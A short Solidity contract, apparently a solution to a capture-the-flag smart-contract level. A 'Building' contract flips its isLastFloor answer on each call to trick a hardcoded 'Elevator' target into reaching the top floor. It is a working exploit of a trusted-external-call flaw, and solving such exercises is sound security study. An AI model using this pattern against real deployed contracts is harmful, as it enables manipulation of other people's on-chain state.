// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Elevator {
    function goTo(uint _floor) external;
}

contract Building {
    bool flag = true;
    Elevator elevator = Elevator(0x4c7c425F112De93Ed5dD8DaF58aa99309Dfee44C);

    function isLastFloor(uint floor) public returns (bool){
        flag = !flag;
        return flag;
    }

    function buildingGoTo() public {
        elevator.goTo(5);
    }
}
